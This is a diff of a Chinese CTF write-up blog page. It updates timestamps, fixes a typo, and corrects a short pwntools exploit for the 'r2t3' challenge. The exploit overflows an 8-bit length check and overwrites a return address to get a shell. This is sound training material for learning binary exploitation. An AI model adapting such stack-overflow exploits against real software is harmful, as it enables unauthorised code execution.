@@ -249,7 +249,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/10/07/QDHPlT9WFS3gx6K.png">
 <meta property="og:image" content="https://i.loli.net/2020/10/07/TwVOht7dcnsZzbN.png">
 <meta property="article:published_time" content="2020-09-07T18:09:30.000Z">
-<meta property="article:modified_time" content="2020-12-04T11:57:41.265Z">
+<meta property="article:modified_time" content="2020-12-11T17:24:11.411Z">
 <meta property="article:author" content="arttnba3">
 <meta property="article:tag" content="信息安全">
 <meta property="article:tag" content="PWN">
@@ -437,7 +437,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-12-04 19:57:41" itemprop="dateModified" datetime="2020-12-04T19:57:41+08:00">2020-12-04</time>
+                <time title="Modified: 2020-12-12 01:24:11" itemprop="dateModified" datetime="2020-12-12T01:24:11+08:00">2020-12-12</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -632,7 +632,7 @@
 <p><img src="https://i.loli.net/2020/09/18/QNlFfbPJyCDL9I5.png" alt="image.png"></p>
 <p>考虑到在<code>name_check()</code>函数中用来存放输入长度的变量为8位无符号整型，范围为0~255，故我们只需要输入260个字节便可以发生上溢降使该变量的值上溢为4，绕过判定</p>
 <p>故构造exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x11</span> + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0</span>x)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./r2t3'</span>)<span class="comment">#p = remote('node3.buuoj.cn',25595)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x11</span> + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x804858b</span>) + <span class="string">b'A'</span> * (<span class="number">260</span> - <span class="number">4</span> - <span class="number">4</span> - <span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./r2t3'</span>)<span class="comment">#p = remote('node3.buuoj.cn',25595)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>发送payload即可getshell</p>
 <p><img src="https://i.loli.net/2020/09/18/XmBDE6Lk8UHlN1R.png" alt="image.png"></p>
@@ -673,7 +673,7 @@
 
 <p><img src="https://i.loli.net/2020/09/20/4RHWBEUrOSaPhXw.png" alt="image.png"></p>
 <h1 id="0x00E-not-the-same-3dsctf-2016-ret2shellcode"><a href="#0x00E-not-the-same-3dsctf-2016-ret2shellcode" class="headerlink" title="0x00E.not_the_same_3dsctf_2016 - ret2shellcode"></a>0x00E.not_the_same_3dsctf_2016 - ret2shellcode</h1><blockquote>
-<p>not the same（指 same（</p>
+<p>not the same（指 the same（</p>
 </blockquote>
 <p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p>
 <p><img src="https://i.loli.net/2020/09/20/lxh7UmuzOJIRvbW.png" alt="image.png"></p>
